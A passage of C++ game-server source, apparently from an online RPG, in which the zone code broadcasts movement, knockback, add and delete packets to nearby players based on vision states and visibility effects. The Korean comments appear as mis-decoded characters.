													if (isPotentialEnemy(pOtherMonster, pMonster))
													{
														pMonster->addPotentialEnemy(pOtherMonster);
														pOtherMonster->addPotentialEnemy(pMonster);
													}
												}
											}
											break;

										//--------------------------------------------------------------------------------
										//
										//--------------------------------------------------------------------------------
										case Creature::CREATURE_CLASS_SLAYER :
											{
												Assert(pCreature->getPlayer() != NULL);

												VisionState prevVS = pCreature->getVisionState(x1,y1);
												VisionState currVS = pCreature->getVisionState(x2,y2);

												// Creature °¡ ObservingEye å®ž °¡ö°í Žžé °¡®¿Ž.
//												EffectObservingEye* pEffectObservingEye = NULL;
//												if ( pCreature->isFlag( Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//												{
//													pEffectObservingEye = dynamic_cast<EffectObservingEye*>( pCreature->findEffect( Effect::EFFECT_CLASS_OBSERVING_EYE ) );
//													//Assert( pEffectObservingEye != NULL );
//												}

												// »óŽë¿¡° PC µîå» Ÿž®Ž ¶.
//												if ((!pMonster->isFlag(Effect::EFFECT_CLASS_HIDE) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) ) //|| ( pEffectRevealerCreature != NULL && pEffectRevealerCreature->canSeeHide( pPC ) ) ) 
//													&& (!pMonster->isFlag(Effect::EFFECT_CLASS_INVISIBILITY) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pMonster ) ) ) 
//													&& (!pMonster->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE) || pCreature->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) )) //|| ( pEffectRevealerCreature != NULL && pEffectRevealerCreature->canSeeSniping( pPC) ) ) )
												if ( canSee( pCreature, pMonster ) )
												{
													if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
													{
														pCreature->getPlayer()->sendPacket(pAddMonsterPacket);
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													} 
													else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
													{
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													}
													else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
													{
														pCreature->getPlayer()->sendPacket(&gcDeleteObject);
													}
												}
											}
											break;

										case Creature::CREATURE_CLASS_VAMPIRE :
											{
												Assert(pCreature->getPlayer() != NULL);

												//--------------------------------------------------------------------------------
												// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
												// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
												// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
												// ºž³»Ÿžž Ž.
												//
												// ¿äŸžé,
												//
												// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
												// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
												//
												//--------------------------------------------------------------------------------
												VisionState prevVS = pCreature->getVisionState(x1,y1);
												VisionState currVS = pCreature->getVisionState(x2,y2);

												// »óŽëŽ ¹ìŸî¹· ³ª darkness»óŽ °ü°èŸøŽ.
												// Hideµµ °ü°èŸøŽ.
												// *NOTE
												// »óŽë°¡ ·¹Ÿî¶óžé ·¹Ÿî°¡ º³ª »óöž © Ÿ Ž.
												if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
												{
													pCreature->getPlayer()->sendPacket(pAddMonsterPacket);
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream(&outputStream);
												}
												else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
												{
													//pCreature->getPlayer()->sendPacket(&gcFastMove);
													pCreature->getPlayer()->sendStream(&outputStream);
												}
												else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
												{
													pCreature->getPlayer()->sendPacket(&gcDeleteObject);
												}
											}
											break;
								
										case Creature::CREATURE_CLASS_OUSTERS :
											{
												Assert(pCreature->getPlayer() != NULL);

												VisionState prevVS = pCreature->getVisionState(x1,y1);
												VisionState currVS = pCreature->getVisionState(x2,y2);

												// »óŽë¿¡° PC µîå» Ÿž®Ž ¶.
												if ( canSee( pCreature, pMonster ) )
												{
													if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
													{
														pCreature->getPlayer()->sendPacket(pAddMonsterPacket);
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													} 
													else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
													{
														//pCreature->getPlayer()->sendPacket(&gcFastMove);
														pCreature->getPlayer()->sendStream(&outputStream);
													}
													else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
													{
														pCreature->getPlayer()->sendPacket(&gcDeleteObject);
													}
												}
											}
											break;
										case Creature::CREATURE_CLASS_NPC :
											{
											}
											break;

										default :
											throw Error("invalid creature class");
			
									}//switch (pCreature->getCreatureClass())
				
								}//case Object::OBJECT_CLASS_CREATURE :
			
								break;

							//--------------------------------------------------------------------------------
							// ž §¿¡ Ÿ » °æ¿ì
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_ITEM :
								{
								}
								break;

							//--------------------------------------------------------------------------------
							// ž §¿¡ å®°¡ » °æ¿ì
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_EFFECT :
								{
								}
								break;

							//--------------------------------------------------------------------------------
							// ž §¿¡ åŸ¹° » °æ¿ì
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_OBSTACLE :
								{
									// darkness
								}
								break;

							//--------------------------------------------------------------------------------
							// ž §¿¡ ÷» » °æ¿ì
							//--------------------------------------------------------------------------------
							case Object::OBJECT_CLASS_PORTAL :
								{
									// darkness
								}
								break;

							default :
								throw Error("invalid object class");

						}//switch ((*itr)->getObjectClass())
					} while ( ++itr != objectList.end() );	// do ~ while
				}//if
			}//for
		}//for


		delete pAddMonsterPacket;
	}

	return true;
	
	__END_DEBUG 
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// (x1,y1)¿¡­ (x2,y2)· PC°¡ µ¿ °æ¿ì, ± PC°¡ ž®°¡ ¹²ñ¿¡ µû¶ó
// »õ· ºž° µŽ °µé¿¡ Žë ºžž ºž³»Ÿ °í, ± PCž »õ· ºž° µŽ
// Žž¥ ©ž®µé¿¡°µµ ºžž ºž³»Ÿ Ž.
//
// bSendMoveŽ move packet» ºž³»Ž°¡¿¡ Žë º¯ö.
// bKnockbackº öç ¿ò÷ »óû ¿ò÷°¡, ŸŽžé knockback¿¡
//  °­û ¿ò÷°¡ž ³ªž³»Ž º¯ö
//////////////////////////////////////////////////////////////////////////////
void Zone::movePCBroadcast (Creature* pPC, ZoneCoord_t x1, ZoneCoord_t y1, ZoneCoord_t x2, ZoneCoord_t y2, bool bSendMove, bool bKnockback)
	throw (ProtocolException, Error)
{
	__BEGIN_TRY

	__BEGIN_PROFILE_ZONE("Z_BC_MOVEPC");

try
{
	//  žîµåŽ PC ž Žë»óž· Ž.
	Assert(pPC->isPC());

	//////////////////////////////////////////////////////////////////////////////
	//  µ¿» ³ªž³»Ž GCMove ¶» žžµéŸîµŽ. ¬¶óŸð®¿¡° GCMovež 
	// ü¶§, (x,y)Ž ü ¥¿©Ÿ žç, dir º ¹¶óºžŽ(µ¿) ¹æâŸîŸ Ž.
	// ±° öç ¥!
	//////////////////////////////////////////////////////////////////////////////
	GCMove gcMove;
	if (bSendMove)
	{
		gcMove.setObjectID(pPC->getObjectID());
		gcMove.setX(x1);
		gcMove.setY(y1);
		gcMove.setDir(pPC->getDir());
	}
	GCKnockBack gcKnockback;
	if (bKnockback)
	{
		gcKnockback.setObjectID(pPC->getObjectID());
		gcKnockback.setOrigin(x1, y1);
		gcKnockback.setTarget(x2, y2);
	}

#ifdef __USE_ENCRYPTER__
	SocketEncryptOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
	outputStream.setEncryptCode( m_EncryptCode );
#else
	SocketOutputStream outputStream( NULL, szPacketHeader + ( bSendMove ? gcMove.getPacketSize() : gcKnockback.getPacketSize() ) + 2 );
#endif
	if ( bSendMove )
		gcMove.writeHeaderNBody( outputStream );
	else
		gcKnockback.writeHeaderNBody( outputStream );

	//////////////////////////////////////////////////////////////////////////////
	// ¿ò÷Ž PCž »õ· ºž°µ Žž¥ PCµé» §­ PC ž¿¡ µû¶ó GCAdd ¶»
	// žžµéŸîµŽ.  öç ¥¿¡ žé, GCAdd ¶º öç ¥ž ¹ž· Ž.
	//////////////////////////////////////////////////////////////////////////////
	Packet* pGCAddXXX = NULL;

	if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_SLAYER) 
	{
		Slayer* pSlayer = dynamic_cast<Slayer*>(pPC);

//		GCAddSlayer* pGCAddSlayer = new GCAddSlayer(pSlayer->getSlayerInfo3());
//		pGCAddSlayer->setEffectInfo(pSlayer->getEffectInfo());
		GCAddSlayer* pGCAddSlayer = new GCAddSlayer;
		makeGCAddSlayer( pGCAddSlayer, pSlayer );
		pGCAddXXX = pGCAddSlayer;
	} 
	else if (pPC->getCreatureClass() == Creature::CREATURE_CLASS_VAMPIRE) 
	{
		Vampire* pVampire = dynamic_cast<Vampire*>(pPC);

		// .. hide»ó¿¡­ ¿ò÷ öŽ Ÿøöžž. ¹·¡ž Žëºñ.
		if (pPC->isFlag(Effect::EFFECT_CLASS_HIDE))
		{
			GCAddBurrowingCreature* pGCABC = new GCAddBurrowingCreature();
			pGCABC->setObjectID(pVampire->getObjectID());
			pGCABC->setName(pVampire->getName());
			pGCABC->setX(x2);
			pGCABC->setY(y2);
			pGCAddXXX = pGCABC;	
		}
		else
		{
//			GCAddVampire* pGCAddVampire = new GCAddVampire(pVampire->getVampireInfo3());
//			pGCAddVampire->setEffectInfo(pVampire->getEffectInfo());
			GCAddVampire* pGCAddVampire = new GCAddVampire;
			makeGCAddVampire( pGCAddVampire, pVampire );
			pGCAddXXX = pGCAddVampire;
		}
	}
	else if ( pPC->getCreatureClass() == Creature::CREATURE_CLASS_OUSTERS )
	{
		Ousters* pOusters = dynamic_cast<Ousters*>(pPC);

//		GCAddOusters* pGCAddOusters = new GCAddOusters( pOusters->getOustersInfo3() );
//		pGCAddOusters->setEffectInfo(pOusters->getEffectInfo());
		GCAddOusters* pGCAddOusters = new GCAddOusters;
		makeGCAddOusters( pGCAddOusters, pOusters );
		pGCAddXXX = pGCAddOusters;
	}

	//////////////////////////////////////////////////////////////////////////////
	// PC°¡ ¿ò÷¹·, ºž°íŽø ³ðµé ¿¡­  PCž žø ºž°
	// µŽ ³ðµéµµ Ž. µé¿¡° ºž³» GCDeleteObject ¶»
	// žžµéŸîµŽ.
	//////////////////////////////////////////////////////////////////////////////
	GCDeleteObject gcDeleteObject;
	gcDeleteObject.setObjectID(pPC->getObjectID());

	Player* pPlayer = pPC->getPlayer();
	Assert(pPlayer != NULL);

	// loop Ÿ¿¡ Žø° ž· »°Ž. by sigi. 2002.5.8
//	Sight_t sight = pPC->getSight();
//	VisionInfo* pVisionInfo = g_pVisionInfoManager->getVisionInfo(sight, pPC->getDir());

//    // ObservingEye å®ž °¡®¿Ž.
//	EffectObservingEye* pEffectObservingEye = NULL;
//	if ( pPC->isFlag(Effect::EFFECT_CLASS_OBSERVING_EYE ) )
//	{
//		pEffectObservingEye = dynamic_cast<EffectObservingEye*>(pPC->findEffect(Effect::EFFECT_CLASS_OBSERVING_EYE));
//		//Assert( pEffectObservingEye != NULL );
//	}

	//////////////////////////////////////////////////////////////////////////////
	// Ÿ ¿µ¿ª »ó¿ì žðµ + 1 Ÿ¿ õ°¡²Ž. 
	// ¯Ž ¹æâ¿¡ µûž¥ ON_SIGHT ¿µ¿ª õ°¡µ±â ¶§¹®Ž.
	//////////////////////////////////////////////////////////////////////////////
	for (ZoneCoord_t ix = max(0, x2 - maxViewportWidth - 1), endx = min(m_Width - 1, x2 + maxViewportWidth + 1) ; ix <= endx ; ix++) 
	{
		for (ZoneCoord_t iy = max(0, y2 - maxViewportUpperHeight - 1), endy = min(m_Height - 1, y2 + maxViewportLowerHeight + 1) ; iy <= endy ; iy++) 
		{
			//if (pPC->isFlag(Effect::EFFECT_CLASS_DARKNESS)) sight = DARKNESS_SIGHT;
			
			// öç ž §¿¡ Ž žðµç ¿ºê§®µé¿¡ Žë ¹º¹Ž.
			const list<Object*> & objectList = m_pTiles[ix][iy].getObjectList();
	
			list<Object*>::const_iterator itr = objectList.begin();

			// 
			// object°¡ Ž °æ¿ìžž 
			// pVisionInfo->getVisionState()ž © ±â §­
			// if - do~while » »ç¿ëŽ. by sigi. 2002.5.8
			//
			if (itr != objectList.end())
			{
				// ü ¥ P(x1,y1)¿¡­ I(ix,iy)°¡ Ÿî¶»° ºžŽ°¡?
//				VisionState prevVisionState = pVisionInfo->getVisionState(x1,y1,ix,iy);
				VisionState prevVisionState = VisionInfoManager::getVisionState( x1, y1, ix, iy );
				// öç ¥ Q(x2,y2)¿¡­ I(ix,iy)°¡ Ÿî¶»° ºžŽ°¡?
//				VisionState curVisionState = pVisionInfo->getVisionState(x2,y2,ix,iy);
				VisionState curVisionState = VisionInfoManager::getVisionState( x2, y2, ix, iy );

				do		
				{
					Assert(*itr != NULL);

					Object* pDebugObject = *itr;

					Object::ObjectClass OClass = pDebugObject->getObjectClass();

					////////////////////////////////////////////////////////////
					// °¢ °Ž OBJECT CLASS¿¡ µû¶ó­ û GCAddXXX ¶»
					// žžµéŸî­ owner ¿¡° üŽ. 
					////////////////////////////////////////////////////////////
					
					////////////////////////////////////////////////////////////
					// ž §¿¡ ©ž®³°¡ » °æ¿ì
					////////////////////////////////////////////////////////////
					if (OClass == Object::OBJECT_CLASS_CREATURE)
					{
						Creature* pCreature = dynamic_cast<Creature*>(*itr);
						Assert(pCreature != NULL);

						if (pCreature == pPC)
						{
							// ³¹é °æ¿ì,  ö¿¡  ¿ò÷Ž ° ŸŽ¶ó, 
							// ž¿¡  ¿ò÷Ž °¹· ºž³»Ÿ Ž.
							if (bKnockback)
							{
								//pPC->getPlayer()->sendPacket(&gcKnockback);
								pPC->getPlayer()->sendStream( &outputStream );
								// ³¹é» ºž³»ážžé continueŽ.
							}

							// ±â  µ¿ ºžŽ ¹» ¿ä°¡ ŸøŽ.
							continue;
						}

						Creature::CreatureClass CClass = pCreature->getCreatureClass();

						// Monster > Slayer > Vampire > NPC ø¶ó°í Ž­
						// if ø­ž ¹²åŽ. ±æµå °¹° °°º °÷º » Žž£°öžž?
						// by sigi. 2002.5.8
						if (CClass == Creature::CREATURE_CLASS_MONSTER)
						{
							Monster* pMonster = dynamic_cast<Monster*>(pCreature);

							//--------------------------------------------------------------------------------
							// ü ¥¿¡­Ž  žóºž º ö ŸøŸúž³ª, µµø ¥¿¡­  žóºž ºž° µ
							// °æ¿ì GCAddMonster ¶» üŽ.
							//--------------------------------------------------------------------------------
							if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
							{											
								// by sigi
								Packet* pAddMonsterPacket = createMonsterAddPacket( pMonster, pPC );

								if (pAddMonsterPacket!=NULL)
								{
									pPlayer->sendPacket( pAddMonsterPacket );

									delete pAddMonsterPacket;
								}
							}

							// PCž žóº áçû ûž· öŽ.
							VisionState vs = pMonster->getVisionState(x2,y2);

							// Aggressive žóº¿¡°žž ûž· µî·Ž.
							if (vs >= IN_SIGHT && pMonster->getAlignment() == ALIGNMENT_AGGRESSIVE) 
							{
								if (isPotentialEnemy(pMonster, pPC))
								{
									pMonster->addPotentialEnemy(pPC);
								}
							}
						}
						else if (CClass == Creature::CREATURE_CLASS_SLAYER)
						{
							// öç ž ¿ø·¡Ž Ÿ ºžŽ°¡  ºžŽ °æ¿ì¿¡, 
							//  ž¿¡ ©ž®°¡ ­ Žžé... 
							// ¿ò÷°í Ž PC¿¡°  ž¿¡ ­ Ž ³ð ºžž ºž³»ŸîŸ Ž.
							if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
							{
								// öç ¿ò÷Ž ©ž®¿¡° º³ª »ó°¡ °·ö Ÿ°³ª,
								// °·Žžé µð® ºñúºô·¯°¡ °·ŸîŸ º ö Ž.
								// canSee · Žë. by bezz 2003.05.29
//								if ( canSee( pPC, pCreature, pEffectObservingEye ) )
								if ( canSee( pPC, pCreature ) )
								{
									Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
//									GCAddSlayer gcAddSlayer(pSlayer->getSlayerInfo3()); 
//									gcAddSlayer.setEffectInfo(pSlayer->getEffectInfo());
									GCAddSlayer gcAddSlayer;
									makeGCAddSlayer( &gcAddSlayer, pSlayer );
									pPlayer->sendPacket(&gcAddSlayer);
								}
							}

							Assert(pCreature->getPlayer() != NULL);

							//////////////////////////////////////////////////////////////////////////////
							// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
							// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
							// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
							// ºž³»Ÿžž Ž.
							//
							// ¿äŸžé,
							//
							// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
							// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
							//////////////////////////////////////////////////////////////////////////////
							VisionState prevVS = pCreature->getVisionState(x1,y1);
							VisionState currVS = pCreature->getVisionState(x2,y2);

							// ºžö ŸŽ ¿µ¿ª¿¡­, °æ°è ¿µ¿ª» °¡ö Ÿ°í ¹·
							// Ÿ ³»º ¿µ¿ªž· µéŸî¿ŽŽ °º º°¡ŽŽ.
							// °  ~ IN_SIGHT¹¿¡ ŸøŽ.
//							Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

							if ( canSee( pCreature, pPC ) )
							{
								if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
								{
									pCreature->getPlayer()->sendPacket(pGCAddXXX);
								} 
								else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
								{
									//if (bSendMove)
									//	pCreature->getPlayer()->sendPacket(&gcMove);
									//else if (bKnockback)
									//	pCreature->getPlayer()->sendPacket(&gcKnockback);
									pCreature->getPlayer()->sendStream( &outputStream );
								}
								else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
								{
									pCreature->getPlayer()->sendPacket(&gcDeleteObject);
								}
							}
						}
						else if (CClass == Creature::CREATURE_CLASS_VAMPIRE)
						{
							//////////////////////////////////////////////////////////////////////////////
							// ü ¥¿¡­Ž ºžö ŸŽ°¡, ¹ø ¥¿¡­ »õ· ºž° µ ©ž®³žž
							// GCAddXXX ž ¹Ÿ¿Ž. ü¿¡µµ NEW_SIGHT °í, ö±µµ NEW_SIGHT žé,
							// »õ· ¹Ÿ¿ö ŸŽŽ.
							//////////////////////////////////////////////////////////////////////////////
							if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT) 
							{
								if ( canSee( pPC, pCreature ) )
								{
									if (pCreature->isFlag(Effect::EFFECT_CLASS_HIDE)) 
									{
//										if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
//											&& (pPC->isVampire() 
//												|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_HIDDEN) )// || ( pEffectRevealer != NULL && pEffectRevealer->canSeeHide( pCreature ) ) ) 
//											)
										{
											GCAddBurrowingCreature gcABC;
											gcABC.setObjectID(pCreature->getObjectID());
											gcABC.setName(pCreature->getName());
											gcABC.setX(ix);
											gcABC.setY(iy);
											pPlayer->sendPacket(&gcABC);
										}
									} 
									else 
									{
//										if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST)
//											&& (!pCreature->isFlag(Effect::EFFECT_CLASS_INVISIBILITY)
//												|| pPC->isVampire() 
//												|| pPC->isFlag(Effect::EFFECT_CLASS_DETECT_INVISIBILITY) || ( pEffectObservingEye != NULL && pEffectObservingEye->canSeeInvisibility( pCreature ) ) )
//											)
										{
											Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
//											GCAddVampire gcAddVampire(pVampire->getVampireInfo3());
//											gcAddVampire.setEffectInfo(pVampire->getEffectInfo());
											GCAddVampire gcAddVampire;
											makeGCAddVampire( &gcAddVampire, pVampire );

											pPlayer->sendPacket(&gcAddVampire);
										}
									}
								}
							}

							Assert(pCreature->getPlayer() != NULL);

							//////////////////////////////////////////////////////////////////////////////
							// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
							// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
							// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
							// ºž³»Ÿžž Ž.
							//
							// ¿äŸžé,
							//
							// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
							// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
							//////////////////////////////////////////////////////////////////////////////
							VisionState prevVS = pCreature->getVisionState(x1,y1);
							VisionState currVS = pCreature->getVisionState(x2,y2);

							// ºžö ŸŽ ¿µ¿ª¿¡­, °æ°è ¿µ¿ª» °¡ö Ÿ°í ¹·
							// Ÿ ³»º ¿µ¿ªž· µéŸî¿ŽŽ °º º°¡ŽŽ.
							// °  ~ IN_SIGHT¹¿¡ ŸøŽ.
//							Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

							// »óŽëŽ ¹ìŸî¹· ³ª darkness»óŽ °ü°èŸøŽ.
							// Hideµµ °ü°èŸøŽ.
//							if (!pPC->isFlag(Effect::EFFECT_CLASS_GHOST)
//								&& (!pPC->isSlayer() 
//									|| !pPC->isFlag(Effect::EFFECT_CLASS_SNIPING_MODE)) 
//								)
							if ( canSee( pCreature, pPC ) )
							{
								if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
								{
									pCreature->getPlayer()->sendPacket(pGCAddXXX);
								}
								else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
								{
									//if (bSendMove) pCreature->getPlayer()->sendPacket(&gcMove);
									////else if (bKnockback) pCreature->getPlayer()->sendPacket(&gcKnockback);
									pCreature->getPlayer()->sendStream( &outputStream );
								}
								else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
								{
									pCreature->getPlayer()->sendPacket(&gcDeleteObject);
								}
							}
						}

						else if (CClass == Creature::CREATURE_CLASS_OUSTERS)
						{
							//////////////////////////////////////////////////////////////////////////////
							// ü ¥¿¡­Ž ºžö ŸŽ°¡, ¹ø ¥¿¡­ »õ· ºž° µ ©ž®³žž
							// GCAddXXX ž ¹Ÿ¿Ž. ü¿¡µµ NEW_SIGHT °í, ö±µµ NEW_SIGHT žé,
							// »õ· ¹Ÿ¿ö ŸŽŽ.
							//////////////////////////////////////////////////////////////////////////////
							if (curVisionState >= IN_SIGHT  && prevVisionState == OUT_OF_SIGHT) 
							{
//								if (!pCreature->isFlag(Effect::EFFECT_CLASS_GHOST) )
								if ( canSee( pPC, pCreature ) )
								{
									Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);
//									GCAddOusters gcAddOusters(pOusters->getOustersInfo3());
//									gcAddOusters.setEffectInfo(pOusters->getEffectInfo());
									GCAddOusters gcAddOusters;
									makeGCAddOusters( &gcAddOusters, pOusters );
									pPlayer->sendPacket(&gcAddOusters);
								}
							}

							Assert(pCreature->getPlayer() != NULL);

							//////////////////////////////////////////////////////////////////////////////
							// Q(x2,y2)°¡  ©ž®³ Ÿ »ç°¢ü °æ°è¿¡ §¡žé­, P(x1,y1)º »ç°¢ü ¿º, 
							// ï ºžö ŸŽ °æ¿ì¿¡žž GCAddXXX ¶» üŽ. ·ž° ö Ÿžžé, PC
							// ©ž®³°¡ pCreature Ÿ °æ°è¿¡­ °è ¿ò÷° µžé °è ­¹öŽ GCAddXXX ¶»
							// ºž³»Ÿžž Ž.
							//
							// ¿äŸžé,
							//
							// OUT_OF_SIGHT -> ON_SIGHT/NEW_SIGHT : GCAddXXX 
							// IN_SIGHT/ON_SIGHT/NEW_SIGHT -> IN_SIGHT/ON_SIGHT/NEW_SIGHT : GCMove
							//////////////////////////////////////////////////////////////////////////////
							VisionState prevVS = pCreature->getVisionState(x1,y1);
							VisionState currVS = pCreature->getVisionState(x2,y2);

							// ºžö ŸŽ ¿µ¿ª¿¡­, °æ°è ¿µ¿ª» °¡ö Ÿ°í ¹·
							// Ÿ ³»º ¿µ¿ªž· µéŸî¿ŽŽ °º º°¡ŽŽ.
//							Assert(prevVS != OUT_OF_SIGHT || currVS != IN_SIGHT);

							if ( canSee( pCreature, pPC ) )
							{
								if (prevVS == OUT_OF_SIGHT && currVS >= IN_SIGHT) 
								{
									pCreature->getPlayer()->sendPacket(pGCAddXXX);
								}
								else if (prevVS >= IN_SIGHT && currVS >= IN_SIGHT) 
								{
									//if (bSendMove) pCreature->getPlayer()->sendPacket(&gcMove);
									//else if (bKnockback) pCreature->getPlayer()->sendPacket(&gcKnockback);
									pCreature->getPlayer()->sendStream( &outputStream );
								}
								else if (prevVS >= IN_SIGHT && currVS == OUT_OF_SIGHT)
								{
									pCreature->getPlayer()->sendPacket(&gcDeleteObject);
								}
							}
						}
						
						else if (CClass == Creature::CREATURE_CLASS_NPC)
						{
							NPC* pNPC = dynamic_cast<NPC*>(pCreature);

							//--------------------------------------------------------------------------------
							//
							// ü ¥¿¡­Ž  žóºž º ö ŸøŸúž³ª, µµø ¥¿¡­  žóºž ºž° µ
							// °æ¿ì GCAddMonster ¶» üŽ.
							//
							//--------------------------------------------------------------------------------
							if (prevVisionState == OUT_OF_SIGHT && curVisionState >= IN_SIGHT) 
							{
								GCAddNPC gcAddNPC;
								makeGCAddNPC(&gcAddNPC, pNPC);
								pPlayer->sendPacket(&gcAddNPC);
							}
						}
						else 
						{
							throw Error("invalid creature class");
						}
					}
					////////////////////////////////////////////////////////////
					// ž §¿¡ Ÿ » °æ¿ì
					////////////////////////////////////////////////////////////
					else if (OClass == Object::OBJECT_CLASS_ITEM)
					{
						if (curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT)
						{
							Item* pItem = dynamic_cast<Item*>(*itr);

							Item::ItemClass IClass = pItem->getItemClass();

							if (IClass == Item::ITEM_CLASS_CORPSE)
							{
								ItemType_t IType = pItem->getItemType();

								if (IType == SLAYER_CORPSE)
								{
									SlayerCorpse* pSlayerCorpse = dynamic_cast<SlayerCorpse*>(pItem);
									GCAddSlayerCorpse gcAddSlayerCorpse;
									makeGCAddSlayerCorpse(&gcAddSlayerCorpse, pSlayerCorpse);
									pPlayer->sendPacket(&gcAddSlayerCorpse);
								}
								else if (IType == VAMPIRE_CORPSE)
								{
									VampireCorpse* pVampireCorpse = dynamic_cast<VampireCorpse*>(pItem);
									GCAddVampireCorpse gcAddVampireCorpse;
									makeGCAddVampireCorpse(&gcAddVampireCorpse, pVampireCorpse);
									pPlayer->sendPacket(&gcAddVampireCorpse);
								}
								else if (IType == OUSTERS_CORPSE)
								{
									OustersCorpse* pOustersCorpse = dynamic_cast<OustersCorpse*>(pItem);
									GCAddOustersCorpse gcAddOustersCorpse;
									makeGCAddOustersCorpse(&gcAddOustersCorpse, pOustersCorpse);
									pPlayer->sendPacket(&gcAddOustersCorpse);
								}
								else if (IType == NPC_CORPSE)
								{
									throw UnsupportedError(__PRETTY_FUNCTION__);
								}
								else if (MONSTER_CORPSE)
								{
									MonsterCorpse* pMonsterCorpse = dynamic_cast<MonsterCorpse*>(pItem);
									GCAddMonsterCorpse gcAddMonsterCorpse;
									makeGCAddMonsterCorpse(&gcAddMonsterCorpse, pMonsterCorpse, ix, iy);
									pPlayer->sendPacket(&gcAddMonsterCorpse);

									sendRelicEffect( pMonsterCorpse, pPlayer );
								}
								else
								{
									Assert(false);
								}
							} 
							else if (pItem->getItemClass() == Item::ITEM_CLASS_MINE && pItem->isFlag(Effect::EFFECT_CLASS_INSTALL))
							{	
								if (pPC->isFlag(Effect::EFFECT_CLASS_REVEALER) )
								{
									GCAddInstalledMineToZone gcAddMine;

									makeGCAddInstalledMineToZone(&gcAddMine, pItem, ix, iy);
									pPlayer->sendPacket(&gcAddMine);
								} 
							}
							else 
							{
								GCAddNewItemToZone gcAddNewItemToZone;
								makeGCAddNewItemToZone(&gcAddNewItemToZone, pItem, ix, iy);
								pPlayer->sendPacket(&gcAddNewItemToZone);
							}
						}
					}
					////////////////////////////////////////////////////////////
					// ž §¿¡ å®°¡ » °æ¿ì
					////////////////////////////////////////////////////////////
					else if (OClass == Object::OBJECT_CLASS_EFFECT)
					{
						Effect* pEffect = dynamic_cast<Effect*>(*itr);
						
						// broadcasting Effect ö © °¡ 2003.3.31 by Sequoia
						if (pEffect->isBroadcastingEffect() && 
							curVisionState >= IN_SIGHT && prevVisionState == OUT_OF_SIGHT)
						{
							if (pEffect->getEffectClass() == Effect::EFFECT_CLASS_VAMPIRE_PORTAL)
							{
